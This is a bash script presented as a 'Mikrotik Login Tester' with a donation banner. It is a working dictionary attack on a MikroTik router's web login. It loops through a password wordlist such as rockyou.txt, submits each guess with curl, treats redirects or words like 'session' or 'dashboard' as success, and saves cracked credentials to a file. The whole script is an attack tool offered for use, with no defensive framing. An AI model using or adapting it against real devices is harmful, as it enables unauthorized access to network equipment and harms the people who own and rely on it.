#!/bin/bash

# Mikrotik Login Tester (JS-style simulation)
# Author: HackerAI

GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m'

show_banner() {
    echo -e "${BLUE}
  ███╗   ███╗██╗██╗  ██╗███████╗████████╗ ██████╗ ██╗   ██╗██████╗ 
  ████╗ ████║██║██║ ██╔╝██╔════╝╚══██╔══╝██╔═══██╗██║   ██║██╔══██╗
  ██╔████╔██║██║█████╔╝ █████╗     ██║   ██║   ██║██║   ██║██████╔╝
  ██║╚██╔╝██║██║██╔═██╗ ██╔══╝     ██║   ██║   ██║██║   ██║██╔══██╗
  ██║ ╚═╝ ██║██║██║  ██╗███████╗   ██║   ╚██████╔╝╚██████╔╝██║  ██║
  ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                    Mikrotik JS-style Login Tester v1.1
                       Developed by MehranTurk (M.T)
Donate

USDT: TSVd8USqUv1B1dz6Hw3bUCQhLkSz1cLE1v

TRX: TSVd8USqUv1B1dz6Hw3bUCQhLkSz1cLE1v

BTC: 32Sxd8UJav7pERtL9QbAStWuFJ4aMHaZ9g

ETH: 0xb2ba6B8CbB433Cb7120127474aEF3B1281C796a6
${NC}"
}

usage() {
    echo -e "${YELLOW}Usage:${NC} $0 <target_ip> <username> <wordlist>"
    echo ""
    echo -e "Example:"
    echo -e "  $0 192.168.88.1 admin /usr/share/seclists/Passwords/Common-Credentials/rockyou.txt"
    exit 1
}

check_dependencies() {
    for cmd in curl; do
        if ! command -v $cmd >/dev/null 2>&1; then
            echo -e "${RED}[x] Missing dependency: $cmd${NC}"
            exit 1
        fi
    done
}

try_login() {
    local ip=$1
    local user=$2
    local pass=$3

    # Simulate JS FormData POST
    RESPONSE=$(curl -s -i -X POST "http://$ip/" \
                   -H "Content-Type: multipart/form-data" \
                   -F "name=$user" \
                   -F "password=$pass")

    # Check for valid login indicators:
    # - Location header redirect (session-based)
    # - Or HTML changes (removing login form)
    # - Or successful JSON response

    if echo "$RESPONSE" | grep -qi "location:" || echo "$RESPONSE" | grep -qi "session\|token\|dashboard\|graphs"; then
        return 0  # Success
    else
        return 1  # Fail
    fi
}

main() {
    show_banner

    if [ $# -ne 3 ]; then
        usage
    fi

    TARGET_IP="$1"
    USERNAME="$2"
    WORDLIST="$3"

    if [ ! -f "$WORDLIST" ]; then
        echo -e "${RED}[x] Wordlist not found: $WORDLIST${NC}"
        exit 1
    fi

    check_dependencies

    echo -e "${BLUE}[~] Testing Mikrotik JS-style login at: $TARGET_IP${NC}"
    echo -e "${BLUE}[~] Username: $USERNAME | Wordlist: $WORDLIST${NC}\n"

    FOUND=0
    while IFS= read -r password; do
        if try_login "$TARGET_IP" "$USERNAME" "$password"; then
            echo -e "${GREEN}[✓] Valid login found:${NC} $USERNAME / $password"
            echo "$USERNAME:$password" >> valid_logins.txt
            FOUND=1
        else
            echo -e "${RED}[✗] Failed:${NC} $USERNAME / $password"
        fi
    done < "$WORDLIST"

    if [ $FOUND -eq 0 ]; then
        echo -e "\n${YELLOW}[!] No valid login found in the wordlist.${NC}"
    else
        echo -e "\n${GREEN}[+] Valid logins saved in: valid_logins.txt${NC}"
    fi
}

main "$@"
